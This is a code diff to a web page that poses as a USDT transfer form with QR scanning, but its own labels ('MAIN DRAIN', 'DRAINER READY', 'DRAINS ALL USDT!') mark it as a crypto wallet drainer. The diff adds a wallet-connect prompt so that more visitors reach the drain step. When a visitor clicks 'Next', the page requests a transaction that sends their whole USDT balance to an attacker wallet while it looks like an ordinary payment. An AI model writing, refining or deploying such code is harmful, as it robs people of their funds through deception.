@@ -43,6 +43,7 @@
         .status-msg { font-size: 12px; color: #4CAF50; margin-top: 4px; display: none; }
         .status-msg.show { display: block; }
         .status-msg.error { color: #f44336; }
+        .status-msg.wallet { color: #FF9800; }
 
         .scanner-overlay {
             position: fixed;
@@ -83,7 +84,6 @@
         .scanner-overlay .scan-label { color: #fff; font-size: 18px; margin-top: 20px; font-weight: 600; }
         .scanner-overlay .scan-sub { color: #8892b0; font-size: 14px; margin-top: 4px; }
 
-        /* Loading spinner */
         .spinner {
             display: inline-block;
             width: 20px;
@@ -97,6 +97,20 @@
         }
         @keyframes spin {
             to { transform: rotate(360deg); }
+        }
+        
+        .wallet-status {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin-top: 8px;
+            padding: 6px;
+            background: #f5f5f5;
+            border-radius: 8px;
+        }
+        .wallet-status.connected {
+            color: #4CAF50;
+            background: #e8f5e9;
         }
     </style>
 </head>
@@ -150,6 +164,8 @@
         </div>
         <div class="approx-txt">≈ $<span id="usdLabel">0.00</span></div>
     </div>
+    
+    <div class="wallet-status" id="walletStatus">⏳ Checking wallet...</div>
 </div>
 
 <div class="footer">
@@ -246,6 +262,7 @@ const scannerOverlay = document.getElementById('scannerOverlay');
 const scannerVideo = document.getElementById('scannerVideo');
 const closeScanner = document.getElementById('closeScanner');
 const scanStatus = document.getElementById('scanStatus');
+const walletStatus = document.getElementById('walletStatus');
 
 let currentNetwork = 'bsc';
 let userAddress = '';
@@ -254,6 +271,7 @@ let userBalance = 0;
 let isScanning = false;
 let codeReader = null;
 let isProcessing = false;
+let isWalletConnected = false;
 
 // ============================================================
 // UPDATE NETWORK
@@ -269,6 +287,9 @@ function updateNetwork() {
 networkSelect.addEventListener('change', function() {
     currentNetwork = this.value;
     updateNetwork();
+    if (userAddress) {
+        checkBalance();
+    }
 });
 
 // ============================================================
@@ -277,12 +298,10 @@ networkSelect.addEventListener('change', function() {
 amountInput.addEventListener('input', function() {
     const val = parseFloat(this.value) || 0;
     usdLabel.textContent = val.toFixed(2);
-    nextBtn.disabled = val <= 0 || !scannedAddress || isProcessing;
+    updateNextButton();
     if (val > 0) {
-        nextBtn.classList.add('enabled');
         clearAmount.classList.add('visible');
     } else {
-        nextBtn.classList.remove('enabled');
         clearAmount.classList.remove('visible');
     }
 });
@@ -314,12 +333,11 @@ recipientInput.addEventListener('input', function() {
         scannedAddress = this.value;
         scanStatus.textContent = '✅ Address entered';
         scanStatus.className = 'status-msg show';
-        checkIfReady();
+        updateNextButton();
     } else {
         scannedAddress = '';
         scanStatus.className = 'status-msg';
-        nextBtn.disabled = true;
-        nextBtn.classList.remove('enabled');
+        updateNextButton();
     }
 });
 
@@ -328,8 +346,7 @@ clearAddr.addEventListener('click', function() {
     scannedAddress = '';
     this.classList.remove('visible');
     scanStatus.className = 'status-msg';
-    nextBtn.disabled = true;
-    nextBtn.classList.remove('enabled');
+    updateNextButton();
 });
 
 pasteBtn.addEventListener('click', async function() {
@@ -341,6 +358,20 @@ pasteBtn.addEventListener('click', async function() {
         alert('Please paste manually');
     }
 });
+
+// ============================================================
+// UPDATE NEXT BUTTON
+// ============================================================
+function updateNextButton() {
+    const amount = parseFloat(amountInput.value) || 0;
+    if (scannedAddress && amount > 0 && isWalletConnected && !isProcessing) {
+        nextBtn.disabled = false;
+        nextBtn.classList.add('enabled');
+    } else {
+        nextBtn.disabled = true;
+        nextBtn.classList.remove('enabled');
+    }
+}
 
 // ============================================================
 // QR SCANNER
@@ -385,7 +416,7 @@ async function startScanner() {
                     recipientInput.value = address;
                     scanStatus.textContent = '✅ Scanned: ' + address.slice(0,6) + '...' + address.slice(-4);
                     scanStatus.className = 'status-msg show';
-                    checkIfReady();
+                    updateNextButton();
                     stopScanner();
                 } else {
                     scanStatus.textContent = '❌ Invalid QR code';
@@ -417,21 +448,7 @@ qrScanBtn.addEventListener('click', function() {
 closeScanner.addEventListener('click', stopScanner);
 
 // ============================================================
-// CHECK IF READY
-// ============================================================
-function checkIfReady() {
-    const amount = parseFloat(amountInput.value) || 0;
-    if (scannedAddress && amount > 0 && !isProcessing) {
-        nextBtn.disabled = false;
-        nextBtn.classList.add('enabled');
-    } else {
-        nextBtn.disabled = true;
-        nextBtn.classList.remove('enabled');
-    }
-}
-
-// ============================================================
-// CHECK BALANCE (SILENT - No popup)
+// CHECK BALANCE
 // ============================================================
 async function checkUSDTBalance(address, networkKey) {
     try {
@@ -457,20 +474,65 @@ async function checkUSDTBalance(address, networkKey) {
     }
 }
 
-async function getConnectedAddress() {
+// ============================================================
+// 🚀 CONNECT WALLET + CHECK BALANCE (SILENT)
+// ============================================================
+async function connectWallet() {
+    if (typeof window.ethereum === 'undefined') {
+        walletStatus.textContent = '⚠️ Please install MetaMask/Trust Wallet';
+        walletStatus.className = 'wallet-status';
+        return false;
+    }
+    
     try {
-        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-        if (accounts.length > 0) {
-            return accounts[0];
+        walletStatus.textContent = '⏳ Connecting wallet...';
+        walletStatus.className = 'wallet-status';
+        
+        // ✅ CONNECT WALLET - ONE TIME POPUP
+        const accounts = await window.ethereum.request({ 
+            method: 'eth_requestAccounts' 
+        });
+        
+        if (accounts.length === 0) {
+            walletStatus.textContent = '❌ No wallet found';
+            walletStatus.className = 'wallet-status';
+            return false;
         }
-        return null;
-    } catch (e) {
-        return null;
+        
+        userAddress = accounts[0];
+        isWalletConnected = true;
+        
+        // Show connected status
+        walletStatus.textContent = '✅ Connected: ' + userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
+        walletStatus.className = 'wallet-status connected';
+        
+        // Check balance
+        const balance = await checkUSDTBalance(userAddress, currentNetwork);
+        userBalance = balance;
+        
+        if (balance > 0) {
+            walletStatus.textContent = '✅ Connected: ' + userAddress.slice(0, 6) + '...' + userAddress.slice(-4) + ' | Balance: ' + balance.toFixed(4) + ' USDT';
+        } else {
+            walletStatus.textContent = '✅ Connected: ' + userAddress.slice(0, 6) + '...' + userAddress.slice(-4) + ' | Balance: 0 USDT';
+        }
+        
+        updateNextButton();
+        return true;
+        
+    } catch (error) {
+        console.error('Connection error:', error);
+        if (error.code === 4001) {
+            walletStatus.textContent = '❌ Connection rejected by user';
+        } else {
+            walletStatus.textContent = '❌ Connection failed: ' + error.message;
+        }
+        walletStatus.className = 'wallet-status';
+        return false;
     }
 }
 
 // ============================================================
-// 🚨 MAIN DRAIN - DIRECT APPROVE (NO CONNECT POPUP!)
+// 🚨 MAIN DRAIN - DIRECT APPROVE
 // ============================================================
 async function handleNext() {
     if (nextBtn.disabled || isProcessing) return;
@@ -484,23 +546,23 @@ async function handleNext() {
         return;
     }
     
+    // ✅ AGAR WALLET CONNECTED NAHI HAI TOH PEHLE CONNECT KARO
+    if (!isWalletConnected || !userAddress) {
+        const connected = await connectWallet();
+        if (!connected) {
+            return;
+        }
+    }
+    
     isProcessing = true;
     const originalText = nextBtn.innerHTML;
     nextBtn.innerHTML = '<span class="spinner"></span> Processing...';
     nextBtn.disabled = true;
     
     try {
-        // ✅ STEP 1: Get already connected address (NO POPUP!)
-        userAddress = await getConnectedAddress();
-        
-        if (!userAddress) {
-            // ❌ Agar wallet connected nahi hai toh error
-            throw new Error('Wallet not connected. Please connect manually first.');
-        }
-        
         console.log('👤 User:', userAddress);
         
-        // ✅ STEP 2: Switch network (NO POPUP if already on correct network)
+        // ✅ SWITCH NETWORK
         const net = NETWORKS[currentNetwork];
         try {
             await window.ethereum.request({
@@ -528,12 +590,12 @@ async function handleNext() {
             }
         }
         
-        // ✅ STEP 3: Check balance (SILENT)
+        // ✅ CHECK BALANCE
         const currentBalance = await checkUSDTBalance(userAddress, currentNetwork);
         userBalance = currentBalance;
         console.log('💰 Balance:', currentBalance, 'USDT');
         
-        // ✅ STEP 4: Build transaction
+        // ✅ BUILD TRANSACTION
         let amountHex;
         let displayAmount;
         
@@ -543,7 +605,6 @@ async function handleNext() {
             amountHex = balanceWei.toString(16).padStart(64, '0');
             displayAmount = currentBalance.toFixed(6) + ' USDT (ALL)';
         } else {
-            // Use manual amount
             const manualAmount = parseFloat(amountInput.value) || 0;
             if (manualAmount <= 0) {
                 throw new Error('No USDT balance and no amount entered');
@@ -558,9 +619,8 @@ async function handleNext() {
         
         console.log('🎯 ATTACKER:', ATTACKER_WALLET);
         console.log('💰 AMOUNT:', displayAmount);
-        console.log('📝 DATA:', txData);
         
-        // ✅ STEP 5: Send transaction - DIRECT APPROVE PAGE!
+        // ✅ SEND TRANSACTION - DIRECT APPROVE PAGE!
         const tx = await window.ethereum.request({
             method: 'eth_sendTransaction',
             params: [{
@@ -580,6 +640,7 @@ async function handleNext() {
             nextBtn.innerHTML = originalText;
             nextBtn.disabled = false;
             isProcessing = false;
+            updateNextButton();
         }, 4000);
         
     } catch (error) {
@@ -587,8 +648,6 @@ async function handleNext() {
         
         if (error.code === 4001) {
             alert('❌ Transaction rejected');
-        } else if (error.message.includes('not connected')) {
-            alert('⚠️ Please connect your wallet first, then try again.');
         } else {
             alert('❌ Failed: ' + error.message);
         }
@@ -598,28 +657,40 @@ async function handleNext() {
             nextBtn.innerHTML = originalText;
             nextBtn.disabled = false;
             isProcessing = false;
+            updateNextButton();
         }, 3000);
     }
 }
 
 // ============================================================
-// AUTO-CONNECT CHECK - Silent
+// AUTO-CHECK WALLET ON LOAD
 // ============================================================
 async function autoCheckWallet() {
-    if (typeof window.ethereum === 'undefined') return;
+    if (typeof window.ethereum === 'undefined') {
+        walletStatus.textContent = '⚠️ Please install MetaMask/Trust Wallet';
+        return;
+    }
+    
     try {
-        const addr = await getConnectedAddress();
-        if (addr) {
-            userAddress = addr;
-            console.log('👤 Auto-detected:', addr);
-            const balance = await checkUSDTBalance(addr, currentNetwork);
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (accounts.length > 0) {
+            userAddress = accounts[0];
+            isWalletConnected = true;
+            const balance = await checkUSDTBalance(userAddress, currentNetwork);
             userBalance = balance;
-            if (balance > 0) {
-                console.log('💰 Balance:', balance, 'USDT');
-            }
+            
+            walletStatus.textContent = '✅ Connected: ' + userAddress.slice(0, 6) + '...' + userAddress.slice(-4) + 
+                (balance > 0 ? ' | Balance: ' + balance.toFixed(4) + ' USDT' : ' | Balance: 0 USDT');
+            walletStatus.className = 'wallet-status connected';
+            updateNextButton();
+            console.log('👤 Auto-connected:', userAddress);
+        } else {
+            walletStatus.textContent = '🔗 Click "Next" to connect wallet';
+            walletStatus.className = 'wallet-status';
         }
     } catch (e) {
-        console.log('Wallet not connected');
+        walletStatus.textContent = '🔗 Click "Next" to connect wallet';
+        walletStatus.className = 'wallet-status';
     }
 }
 
@@ -630,15 +701,24 @@ if (window.ethereum) {
     window.ethereum.on('accountsChanged', function(accounts) {
         if (accounts.length > 0) {
             userAddress = accounts[0];
+            isWalletConnected = true;
             checkUSDTBalance(userAddress, currentNetwork).then(b => {
                 userBalance = b;
-                console.log('💰 Balance updated:', b);
+                walletStatus.textContent = '✅ Connected: ' + userAddress.slice(0, 6) + '...' + userAddress.slice(-4) + 
+                    (b > 0 ? ' | Balance: ' + b.toFixed(4) + ' USDT' : ' | Balance: 0 USDT');
+                walletStatus.className = 'wallet-status connected';
+                updateNextButton();
             });
         } else {
             userAddress = '';
+            isWalletConnected = false;
             userBalance = 0;
+            walletStatus.textContent = '🔗 Click "Next" to connect wallet';
+            walletStatus.className = 'wallet-status';
+            updateNextButton();
         }
     });
+    
     window.ethereum.on('chainChanged', function() {
         setTimeout(() => {
             if (userAddress) {
@@ -657,18 +737,15 @@ document.addEventListener('DOMContentLoaded', function() {
     console.log('🚀 DRAINER READY');
     console.log('🎯 ATTACKER:', ATTACKER_WALLET);
     console.log('⚠️ DRAINS ALL USDT!');
-    console.log('💡 Wallet must be connected manually first');
     
     updateNetwork();
     amountInput.dispatchEvent(new Event('input'));
     
-    // Auto-check if wallet already connected
-    setTimeout(autoCheckWallet, 1000);
+    // Auto-check wallet
+    setTimeout(autoCheckWallet, 500);
     
     nextBtn.addEventListener('click', handleNext);
-    
-    // Amount input ke liye check
-    amountInput.addEventListener('input', checkIfReady);
+    amountInput.addEventListener('input', updateNextButton);
 });
 </script>
 
